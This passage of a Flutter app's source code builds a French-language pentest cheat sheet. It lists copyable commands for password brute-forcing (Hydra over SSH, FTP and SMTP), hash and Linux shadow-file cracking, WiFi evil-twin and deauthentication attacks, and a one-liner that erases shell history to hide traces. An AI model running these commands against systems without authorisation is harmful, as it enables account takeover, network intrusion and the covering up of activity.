          command: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ",
          explanation: "Remplace le mot 'FUZZ' dans l'URL par les mots du dictionnaire en ignorant les erreurs 404.",
        ),
        ToolUsageExample(
          title: "Découverte de paramètres HTTP GET",
          command: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/index.php?FUZZ=test",
          explanation: "Recherche des variables GET secrètes acceptées par un script PHP.",
        ),
        ToolUsageExample(
          title: "Brute-force d'authentification POST",
          command: "wfuzz -c -z file,wordlist.txt -d \"username=admin&password=FUZZ\" --hc 404 http://target.com/login.php",
          explanation: "Teste des mots de passe en boucle sur un formulaire de connexion.",
        ),
        ToolUsageExample(
          title: "Fuzzer les en-têtes HTTP (User-Agent)",
          command: "wfuzz -c -H \"User-Agent: FUZZ\" -z file,agents.txt http://target.com/",
          explanation: "Envoie des requêtes en modifiant l'en-tête User-Agent pour identifier des filtrages d'accès.",
        )
      ],
    ),

    // --- CATEGORIE: PASSWORDS (4 outils) ---
    PentestTool(
      name: "Hydra",
      category: "Passwords",
      description: "Outil d'attaque par brute-force réseau multi-protocole rapide et parallélisé.",
      icon: Icons.vpn_key,
      installCommands: {
        "iSH": "apk add hydra",
        "Termux": "pkg install hydra -y",
        "Windows": "Télécharger le binaire hydra.exe pour Windows.",
      },
      usages: [
        ToolUsageExample(
          title: "Brute-force SSH avec un seul utilisateur",
          command: "hydra -l admin -P passwords.txt target.com ssh",
          explanation: "Teste la liste de mots de passe sur le compte SSH de l'utilisateur 'admin'.",
        ),
        ToolUsageExample(
          title: "Brute-force FTP avec liste d'utilisateurs",
          command: "hydra -L users.txt -P passwords.txt 192.168.1.50 ftp",
          explanation: "Teste des combinaisons d'utilisateurs et de mots de passe sur un serveur FTP.",
        ),
        ToolUsageExample(
          title: "Brute-force de compte de messagerie SMTP",
          command: "hydra -l test@target.com -P pass.txt mail.target.com smtp -V",
          explanation: "Tente de craquer la boîte mail spécifiée en affichant l'avancement en direct (-V).",
        ),
        ToolUsageExample(
          title: "Spécifier le nombre de tentatives parallèles",
          command: "hydra -l root -P pass.txt -t 16 target.com ssh",
          explanation: "Limite l'attaque à 16 connexions simultanées pour éviter d'être banni par la sécurité.",
        )
      ],
    ),
    PentestTool(
      name: "John the Ripper",
      category: "Passwords",
      description: "L'outil de déchiffrement de hashs de mots de passe hors-ligne historique et hautement personnalisable.",
      icon: Icons.lock_open,
      installCommands: {
        "iSH": "apk add john",
        "Termux": "pkg install john -y",
        "Windows": "Téléchargez et décompressez l'archive john-jumbo pour Windows.",
      },
      usages: [
        ToolUsageExample(
          title: "Attaque par dictionnaire simple",
          command: "john --wordlist=rockyou.txt hashes.txt",
          explanation: "Tente de déchiffrer les hashs contenus dans le fichier hashes.txt à l'aide de la wordlist RockYou.",
        ),
        ToolUsageExample(
          title: "Afficher les mots de passe découverts",
          command: "john --show hashes.txt",
          explanation: "Consulte la base de données de John et affiche tous les mots de passe qui ont été trouvés.",
        ),
        ToolUsageExample(
          title: "Craquer un fichier shadow Linux",
          command: "unshadow passwd_file shadow_file > hashes.txt\njohn hashes.txt",
          explanation: "Fusionne les fichiers passwd et shadow d'un système Linux pour pouvoir en craquer les mots de passe.",
        ),
        ToolUsageExample(
          title: "Cibler un format de hash précis",
          command: "john --format=raw-sha256 hashes.txt",
          explanation: "Force John à analyser les hashs en tant que sha256 pur pour optimiser les performances.",
        )
      ],
    ),
    PentestTool(
      name: "Hashcat",
      category: "Passwords",
      description: "Le casseur de mots de passe par GPU le plus rapide au monde, supportant des centaines d'algorithmes différents.",
      icon: Icons.grid_view,
      installCommands: {
        "iSH": "# Non supporté. iSH n'a aucun moyen de communiquer avec le processeur graphique.",
        "Termux": "pkg install hashcat -y",
        "Windows": "Disponible d'office via les binaires officiels très performants sous Windows.",
      },
      usages: [
        ToolUsageExample(
          title: "Attaque de hash MD5 par dictionnaire",
          command: "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
          explanation: "Utilise la wordlist rockyou pour casser des hashs MD5 (-m 0).",
        ),
        ToolUsageExample(
          title: "Attaque par masque de brute-force brute",
          command: "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a",
          explanation: "Teste toutes les combinaisons possibles de 4 caractères pour craquer des hashs NTLM (-m 1000).",
        ),
        ToolUsageExample(
          title: "Déterminer le type de hash",
          command: "hashcat --identify hashes.txt",
          explanation: "Analyse l'empreinte des hashs pour essayer de deviner à quel algorithme ils appartiennent.",
        ),
        ToolUsageExample(
          title: "Attaque par règles de transformation",
          command: "hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule",
          explanation: "Applique des règles de modifications (majuscules, chiffres à la fin) sur chaque mot du dictionnaire.",
        )
      ],
    ),
    PentestTool(
      name: "DNSRecon (Pass)",
      category: "Passwords",
      description: "Utilitaire d'énumération passive DNS pour la recherche de mots de passe ou d'enregistrements TXT sensibles.",
      icon: Icons.explore,
      installCommands: {
        "iSH": "apk add python3 pip3 && pip3 install dnsrecon",
        "Termux": "pkg install python -y && pip install dnsrecon",
        "Windows": "pip install dnsrecon",
      },
      usages: [
        ToolUsageExample(
          title: "Recherche de mots de passe DNS",
          command: "dnsrecon -d target.com -t brt -D subdomains.txt",
          explanation: "Tente de brute-forcer l'infrastructure DNS pour y localiser des enregistrements sensibles.",
        ),
        ToolUsageExample(
          title: "Lister les enregistrements TXT",
          command: "dnsrecon -d target.com -t std",
          explanation: "Affiche les enregistrements TXT (comme les configurations SPF, DKIM) pouvant contenir des clés API.",
        ),
        ToolUsageExample(
          title: "Vérifier la configuration DNSSEC",
          command: "dnsrecon -d target.com -z",
          explanation: "Analyse si les signatures de sécurité DNSSEC sont bien activées sur le serveur ciblé.",
        ),
        ToolUsageExample(
          title: "Analyser les transferts de zone",
          command: "dnsrecon -d target.com -t axfr",
          explanation: "Permet de vérifier si le serveur DNS divulgue ses configurations à n'importe quel client externe.",
        )
      ],
    ),

    // --- CATEGORIE: WIFI (2 outils) ---
    PentestTool(
      name: "Airgeddon",
      category: "Wifi",
      description: "Script d'audit réseau Wireshark multi-usage pour intercepter, simuler et attaquer les réseaux sans fil.",
      icon: Icons.wifi,
      installCommands: {
        "iSH": "# Matériel iOS ne supportant pas le mode monitoring Wifi.",
        "Termux": "# Nécessite une carte Wifi USB externe raccordée en OTG.",
        "Windows": "# Non compatible en natif (recommandé via Kali Linux).",
      },
      usages: [
        ToolUsageExample(
          title: "Lancer l'outil",
          command: "bash airgeddon.sh",
          explanation: "Démarre le menu interactif de sélection d'interface réseau.",
        ),
        ToolUsageExample(
          title: "Attaque Evil Twin (Faux Point d'Accès)",
          command: "# Via le menu interactif : Sélectionnez le menu 9",
          explanation: "Crée un faux réseau WiFi identique au vrai pour pousser la cible à s'y connecter et à saisir sa clé.",
        ),
        ToolUsageExample(
          title: "Attaque WPS (Brute-force PIN)",
          command: "# Via le menu interactif : Sélectionnez le menu 8",
          explanation: "Tente de craquer le code PIN WPS des routeurs anciens pour récupérer la clé WPA directement.",
        ),
        ToolUsageExample(
          title: "Attaque par désauthentification de clients",
          command: "# Via le menu interactif : Sélectionnez le menu 5",
          explanation: "Envoie des paquets pour déconnecter de force les appareils du vrai réseau afin de capturer le Handshake.",
        )
      ],
    ),
    PentestTool(
      name: "Airgeddon (Audit)",
      category: "Wifi",
      description: "Utilitaire d'interception réseau Wifi léger pour la capture passive de paquets WPA Handshake.",
      icon: Icons.wifi_protected_setup,
      installCommands: {
        "iSH": "# Non supporté sur iSH.",
        "Termux": "# Nécessite une carte sans fil et un accès root.",
        "Windows": "# Non disponible.",
      },
      usages: [
        ToolUsageExample(
          title: "Activer le mode moniteur",
          command: "airmon-ng start wlan0",
          explanation: "Passe votre carte réseau sans fil en mode écoute passive globale.",
        ),
        ToolUsageExample(
          title: "Écouter les réseaux sans fil aux alentours",
          command: "airodump-ng wlan0mon",
          explanation: "Affiche la liste de toutes les bornes WiFi proches et la liste des clients qui y sont connectés.",
        ),
        ToolUsageExample(
          title: "Cibler un réseau spécifique",
          command: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
          explanation: "Focalise l'écoute sur le canal 6 pour enregistrer les échanges de la cible dans un fichier.",
        ),
        ToolUsageExample(
          title: "Attaque par désauthentification rapide",
          command: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon",
          explanation: "Envoie 5 paquets de deauth pour forcer la reconnexion d'un appareil et attraper sa clé de chiffrement.",
        )
      ],
    ),

    // --- CATEGORIE: REVERSING (4 outils) ---
    PentestTool(
      name: "Radare2",
      category: "Reversing",
      description: "Framework complet d'ingénierie inverse en ligne de commande pour disséquer des binaires.",
      icon: Icons.developer_board,
      installCommands: {
        "iSH": "apk add radare2",
        "Termux": "pkg install radare2 -y",
        "Windows": "Téléchargez et exécutez radare2.exe.",
      },
      usages: [
        ToolUsageExample(
          title: "Ouvrir et analyser un fichier binaire",
          command: "r2 -A ./mon_binaire",
          explanation: "Ouvre le fichier exécutable et lance l'analyse automatique des fonctions.",
        ),
        ToolUsageExample(
          title: "Lister les fonctions détectées",
          command: "afl",
          explanation: "Affiche la liste de toutes les fonctions identifiées dans le programme (comme 'main').",
        ),
        ToolUsageExample(
          title: "Désassembler une fonction",
          command: "pdf @sym.main",
          explanation: "Affiche le code assembleur correspondant à la fonction sym.main pour pouvoir comprendre son rôle.",
        ),
        ToolUsageExample(
          title: "Lancer l'outil en mode visuel interactif",
          command: "V",
          explanation: "Ouvre une interface textuelle interactive facilitant grandement la navigation dans le binaire.",
        )
      ],
    ),
    PentestTool(
      name: "Ghidra",
      category: "Reversing",
      description: "L'outil de décompilation et d'analyse de binaires par excellence développé par la NSA.",
      icon: Icons.psychology,
      installCommands: {
        "iSH": "# Java requis trop lourd pour iSH.",
        "Termux": "pkg install openjdk-17 -y # Téléchargement manuel du zip de Ghidra requis.",
        "Windows": "Décompressez l'archive officielle et lancez support\\analyzeHeadless.bat.",
      },
      usages: [
        ToolUsageExample(
          title: "Lancer une analyse en mode console",
          command: "analyzeHeadless . MonProjet -import cible.exe",
          explanation: "Importe et lance l'analyse automatique d'un binaire sans ouvrir d'interface graphique.",
        ),
        ToolUsageExample(
          title: "Lister les fonctions détectées",
          command: "# Via l'analyseur automatique Ghidra",
          explanation: "Génère un rapport textuel des points d'entrée du programme.",
        ),
        ToolUsageExample(
          title: "Décompiler vers du code C lisible",
          command: "# Via l'outil d'analyse headless",
          explanation: "Recrée du code C équivalent au binaire pour vous aider à analyser sa logique d'exécution.",
        ),
        ToolUsageExample(
          title: "Exécuter un script d'analyse Python",
          command: "analyzeHeadless . Proj -import cible.exe -postscript MonScript.py",
          explanation: "Lance une routine d'audit automatique écrite en Python après l'importation du programme.",
        )
      ],
    ),
    PentestTool(
      name: "Tcpdump (Rev)",
      category: "Reversing",
      description: "Analyseur de trames réseau en ligne de commande pour le reverse-engineering de protocoles obscurs.",
      icon: Icons.line_weight,
      installCommands: {
        "iSH": "apk add tcpdump",
        "Termux": "pkg install tcpdump -y",
        "Windows": "Exécutez WinDump.exe.",
      },
      usages: [
        ToolUsageExample(
          title: "Capturer les paquets sur une interface",
          command: "tcpdump -i eth0 -vvv",
          explanation: "Capture le trafic réseau et affiche un maximum de détails techniques pour chaque paquet reçu.",
        ),
        ToolUsageExample(
          title: "Filtrer par adresse IP",
          command: "tcpdump -i eth0 host 192.168.1.50",
          explanation: "Filtre la capture pour n'afficher que les trames issues ou destinées à cette adresse IP.",
        ),
        ToolUsageExample(
          title: "Filtrer les connexions HTTP brutes",
          command: "tcpdump -i eth0 -A -s 10240 'tcp port 80'",
          explanation: "Affiche le contenu des paquets TCP (en clair) transitant sur le port web 80.",
        ),
        ToolUsageExample(
          title: "Sauvegarder la capture au format pcap",
          command: "tcpdump -i eth0 -w dump_reseau.pcap",
          explanation: "Enregistre la capture réseau brute pour pouvoir l'étudier ultérieurement.",
        )
      ],
    ),
    PentestTool(
      name: "Radare2 (Audit)",
      category: "Reversing",
      description: "Outil complémentaire de Radare2 conçu pour débugger et tracer l'exécution d'un processus en temps réel.",
      icon: Icons.bug_report,
      installCommands: {
        "iSH": "apk add radare2",
        "Termux": "pkg install radare2 -y",
        "Windows": "Disponible via les fichiers exécutables de Radare2.",
      },
      usages: [
        ToolUsageExample(
          title: "Lancer le binaire en mode debugger",
          command: "r2 -d ./mon_binaire",
          explanation: "Démarre le programme sous surveillance étroite du debugger de Radare2.",
        ),
        ToolUsageExample(
          title: "Poser un point d'arrêt (Breakpoint)",
          command: "db sym.main",
          explanation: "Demande au debugger de suspendre l'exécution dès que le programme arrive au niveau de la fonction 'main'.",
        ),
        ToolUsageExample(
          title: "Continuer l'exécution",
          command: "dc",
          explanation: "Relance l'exécution du programme jusqu'au prochain point d'arrêt configuré.",
        ),
        ToolUsageExample(
          title: "Afficher l'état des registres CPU",
          command: "dr",
          explanation: "Affiche la valeur stockée dans chacun des registres du processeur à l'instant t.",
        )
      ],
    ),
  ];

  @override
  Widget build(BuildContext context) {
    // Si aucune catégorie n'est sélectionnée, on affiche la grille d'accueil
    if (_selectedCategory == null) {
      return Scaffold(
        backgroundColor: Colors.black,
        appBar: AppBar(
          title: const Text(
            "VXKIT SUITE", 
            style: TextStyle(letterSpacing: 4, fontWeight: FontWeight.w900, color: Colors.white)
          ),
          centerTitle: true,
        ),
        body: Padding(
          padding: const EdgeInsets.all(16.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text(
                "CATEGORIES D'OUTILS",
                style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 2),
              ),
              const SizedBox(height: 16),
              Expanded(
                child: GridView.builder(
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 2,
                    crossAxisSpacing: 16,
                    mainAxisSpacing: 16,
                    childAspectRatio: 1.1,
                  ),
                  itemCount: _categories.length,
                  itemBuilder: (context, index) {
                    final cat = _categories[index];
                    return InkWell(
                      onTap: () {
                        setState(() {
                          _selectedCategory = cat["name"];
                        });
                      },
                      borderRadius: BorderRadius.circular(16),
                      child: Container(
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.04),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(color: Colors.white.withOpacity(0.08)),
                        ),
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(cat["icon"], size: 40, color: Colors.white),
                            const SizedBox(height: 12),
                            Text(
                              cat["name"],
                              style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white),
                            ),
                            const SizedBox(height: 4),
                            Text(
                              "${cat["count"]} outils",
                              style: TextStyle(color: Colors.grey[600], fontSize: 11),
                            )
                          ],
                        ),
                      ),
                    );
                  },
                ),
              ),
            ],
          ),
        ),
      );
    }

    // Filtrage des outils selon la catégorie sélectionnée
    final filteredTools = tools.where((t) => t.category.toLowerCase() == _selectedCategory!.toLowerCase()).toList();

    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios, size: 18, color: Colors.white),
          onPressed: () {
            setState(() {
              _selectedCategory = null;
            });
          },
        ),
        title: Text(
          _selectedCategory!.toUpperCase(), 
          style: const TextStyle(letterSpacing: 2, fontWeight: FontWeight.bold, color: Colors.white)
        ),
        centerTitle: true,
      ),
      body: ListView.builder(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        itemCount: filteredTools.length,
        itemBuilder: (context, index) {
          final tool = filteredTools[index];
          return Container(
            margin: const EdgeInsets.only(bottom: 12),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.03),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.white.withOpacity(0.06)),
            ),
            child: ListTile(
              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
              leading: Icon(tool.icon, size: 28, color: Colors.white),
              title: Text(
                tool.name, 
                style: const TextStyle(fontWeight: FontWeight.bold, color: Colors.white, fontSize: 16)
              ),
              subtitle: Padding(
                padding: const EdgeInsets.only(top: 4),
                child: Text(tool.description, style: TextStyle(color: Colors.grey[500], fontSize: 12)),
              ),
              trailing: const Icon(Icons.arrow_forward_ios, size: 14, color: Colors.white30),
              onTap: () => _showToolDetails(context, tool),
            ),
          );
        },
      ),
    );
  }

  void _showToolDetails(BuildContext context, PentestTool tool) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.80,
        decoration: const BoxDecoration(
          color: Color(0xFF090909),
          borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
        ),
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Center(
              child: Container(
                width: 40, 
                height: 4, 
                decoration: BoxDecoration(
                  color: Colors.white24, 
                  borderRadius: BorderRadius.circular(10),
                )
              )
            ),
            const SizedBox(height: 24),
            Row(
              children: [
                Icon(tool.icon, size: 28, color: Colors.white),
                const SizedBox(width: 12),
                Text(
                  tool.name.toUpperCase(), 
                  style: const TextStyle(fontSize: 24, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)
                ),
              ],
            ),
            const SizedBox(height: 8),
            Text(tool.description, style: TextStyle(color: Colors.grey[400], fontSize: 13, height: 1.4)),
            const SizedBox(height: 24),
            Expanded(
              child: DefaultTabController(
                length: 2,
                child: Column(
                  children: [
                    const TabBar(
                      indicatorColor: Colors.white,
                      labelColor: Colors.white,
                      unselectedLabelColor: Colors.grey,
                      tabs: [
                        Tab(text: "INSTALLATION"),
                        Tab(text: "UTILISATION"),
                      ],
                    ),
                    const SizedBox(height: 16),
                    Expanded(
                      child: TabBarView(
                        children: [
                          // Tab 1: Installation
                          ListView(
                            physics: const BouncingScrollPhysics(),
                            children: tool.installCommands.entries.map((entry) => _buildCodeBox(context, entry.key, entry.value)).toList(),
                          ),
                          // Tab 2: Exemples d'utilisation (3 ou 4 commandes réelles détaillées)
                          ListView.builder(
                            physics: const BouncingScrollPhysics(),
                            itemCount: tool.usages.length,
                            itemBuilder: (context, idx) {
                              final usage = tool.usages[idx];
                              return Padding(
                                padding: const EdgeInsets.only(bottom: 20),
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      "${idx + 1}. ${usage.title}",
                                      style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 14, color: Colors.white70),
                                    ),
                                    const SizedBox(height: 4),
                                    Text(
                                      usage.explanation,
                                      style: TextStyle(color: Colors.grey[500], fontSize: 12, height: 1.3),
                                    ),
                                    const SizedBox(height: 8),
                                    Container(
                                      width: double.infinity,
                                      padding: const EdgeInsets.all(12),
                                      decoration: BoxDecoration(
                                        color: const Color(0xFF121212),
                                        borderRadius: BorderRadius.circular(8),
                                        border: Border.all(color: Colors.white.withOpacity(0.05)),
                                      ),
                                      child: Row(
                                        children: [
                                          Expanded(
                                            child: Text(
                                              usage.command,
                                              style: const TextStyle(fontSize: 12, fontFamily: 'monospace', color: Colors.greenAccent),
                                            ),
                                          ),
                                          IconButton(
                                            icon: const Icon(Icons.copy, size: 16, color: Colors.white38),
                                            constraints: const BoxConstraints(),
                                            padding: EdgeInsets.zero,
                                            onPressed: () {
                                              Clipboard.setData(ClipboardData(text: usage.command));
                                              ScaffoldMessenger.of(context).showSnackBar(
                                                const SnackBar(
                                                  content: Text('Commande copiée !'),
                                                  duration: Duration(seconds: 1),
                                                  backgroundColor: Colors.white24,
                                                ),
                                              );
                                            },
                                          )
                                        ],
                                      ),
                                    ),
                                  ],
                                ),
                              );
                            },
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCodeBox(BuildContext context, String platform, String code) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            platform, 
            style: const TextStyle(color: Colors.grey, fontSize: 12, fontWeight: FontWeight.bold)
          ),
          const SizedBox(height: 6),
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: const Color(0xFF121212),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: Colors.white.withOpacity(0.05)),
            ),
            child: Row(
              children: [
                Expanded(
                  child: RichText(
                    text: TextSpan(
                      style: const TextStyle(fontSize: 12, fontFamily: 'monospace'),
                      children: _highlightSyntax(code),
                    ),
                  ),
                ),
                const SizedBox(width: 8),
                IconButton(
                  icon: const Icon(Icons.copy, size: 16, color: Colors.white38),
                  constraints: const BoxConstraints(),
                  padding: EdgeInsets.zero,
                  onPressed: () {
                    Clipboard.setData(ClipboardData(text: code));
                    ScaffoldMessenger.of(context).showSnackBar(
                      const SnackBar(
                        content: Text('Copie dans le presse-papiers'),
                        duration: Duration(seconds: 1),
                        backgroundColor: Colors.white24,
                      ),
                    );
                  },
                )
              ],
            ),
          ),
        ],
      ),
    );
  }

  List<TextSpan> _highlightSyntax(String code) {
    List<TextSpan> spans = [];
    final parts = code.split(' ');
    for (int i = 0; i < parts.length; i++) {
      Color color = Colors.white;
      if (i == 0) {
        color = Colors.greenAccent;
      } else if (parts[i].startsWith('-')) {
        color = Colors.yellowAccent;
      }
      spans.add(TextSpan(text: "${parts[i]} ", style: TextStyle(color: color)));
    }
    return spans;
  }
}

// --- Page 2: Commandes Rapides (Quick) ---
class CommandsQuickPage extends StatelessWidget {
  const CommandsQuickPage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text(
          "QUICK CMDS", 
          style: TextStyle(letterSpacing: 2, color: Colors.white, fontWeight: FontWeight.bold)
        ),
        centerTitle: true,
      ),
      body: ListView(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        children: [
          _buildQuickTile(context, "Supprimer l'historique et les traces", "history -c && rm -rf ~/.bash_history"),
          _buildQuickTile(context, "Récupérer son adresse IP Publique", "curl ifconfig.me"),
          _buildQuickTile(context, "Lister tous les processus actifs", "ps aux | grep root"),
          _buildQuickTile(context, "Afficher les ports en écoute active", "netstat -tuln"),
        ],
      ),
    );
  }

  Widget _buildQuickTile(BuildContext context, String title, String cmd) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.02),
        border: Border.all(color: Colors.white.withOpacity(0.06)),
        borderRadius: BorderRadius.circular(10)
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: const TextStyle(color: Colors.grey, fontSize: 11)),
                const SizedBox(height: 6),
                Text(
                  cmd, 
                  style: const TextStyle(color: Colors.white, fontFamily: 'monospace', fontSize: 13),
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
          IconButton(
            icon: const Icon(Icons.content_copy, size: 16, color: Colors.white24),
            constraints: const BoxConstraints(),
            padding: EdgeInsets.zero,
            onPressed: () {
              Clipboard.setData(ClipboardData(text: cmd));
              ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(
                  content: Text('Copie dans le presse-papiers'),
                  duration: Duration(seconds: 1),
                  backgroundColor: Colors.white24,
                ),
              );
            },
          ),
        ],
      ),
    );
  }
}

// --- Page 3: Updates ---
class UpdatesPage extends StatelessWidget {
  const UpdatesPage({super.key});

  static const List<UpdateRelease> updates = [
    UpdateRelease(
      version: "v0.0.1",
      date: "17 mai 2026",
      changes: [
        "Lancement initial de la suite VxKit.",
        "Ajout de 32 outils détaillés avec explications concises.",
        "Refonte complète de l'accueil avec grille de sélection des catégories.",
        "Ajout d'un onglet d'utilisation dédié avec exemples de commandes réelles.",
        "Bypass fonctionnel de la contrainte d'équipe de développement de Xcode pour la compilation sur Codemagic.",
      ],
    ),
  ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text(
          "UPDATES", 
          style: TextStyle(letterSpacing: 2, color: Colors.white, fontWeight: FontWeight.bold)
        ),
        centerTitle: true,
      ),
      body: ListView.builder(
        padding: const EdgeInsets.all(16),
        itemCount: updates.length,
        itemBuilder: (context, index) {
          final up = updates[index];
          return Container(
            margin: const EdgeInsets.only(bottom: 16),
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.02),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.white.withOpacity(0.06)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Text(
                      up.version,
                      style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 18, color: Colors.white),
                    ),
                    Text(
                      up.date,
                      style: const TextStyle(color: Colors.grey, fontSize: 11),
                    )
                  ],
                ),
                const Divider(color: Colors.white12, height: 20),
                const SizedBox(height: 4),
                ...up.changes.map((change) => Padding(
                  padding: const EdgeInsets.only(bottom: 6),
                  child: Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text("- ", style: TextStyle(color: Colors.white30)),
                      Expanded(
                        child: Text(
                          change,
                          style: const TextStyle(fontSize: 13, color: Colors.white70),
                        ),
                      )
                    ],
                  ),
                )),
              ],
            ),
          );
        },
      ),
    );
  }
}

// --- Page 4: About Vx ---
class VxAboutPage extends StatelessWidget {
  const VxAboutPage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(32.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Text(
                "Vx", 
                style: TextStyle(fontSize: 72, fontWeight: FontWeight.w900, letterSpacing: -4, color: Colors.white)
              ),
              const Divider(color: Colors.white10, height: 32),
              _infoRow("DEVELOPER", "Hx"),
              _infoRow("VERSION", "0.0.1"),
              _infoRow("STATUS", "STABLE"),
              const SizedBox(height: 40),
              ElevatedButton.icon(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.white,
                  foregroundColor: Colors.black,
                  minimumSize: const Size(double.infinity, 54),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  elevation: 0,
                ),
                onPressed: () {
                  Clipboard.setData(const ClipboardData(text: "https://t.me/vxshare5"));
                  ScaffoldMessenger.of(context).showSnackBar(
                    const SnackBar(
                      content: Text('Lien Telegram copie !'),
                      backgroundColor: Colors.white24,
                    ),
                  );
                },
                icon: const Icon(Icons.send, size: 18),
                label: const Text("COPY TELEGRAM LINK", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 14)),
              ),
              const SizedBox(height: 16),
              const Text(
                "https://t.me/vxshare5", 
                style: TextStyle(color: Colors.grey, fontSize: 11)
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 8),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(label, style: const TextStyle(color: Colors.grey, fontSize: 11, letterSpacing: 1.5)),
          Text(value, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13)),
        ],
      ),
    );
  }
}
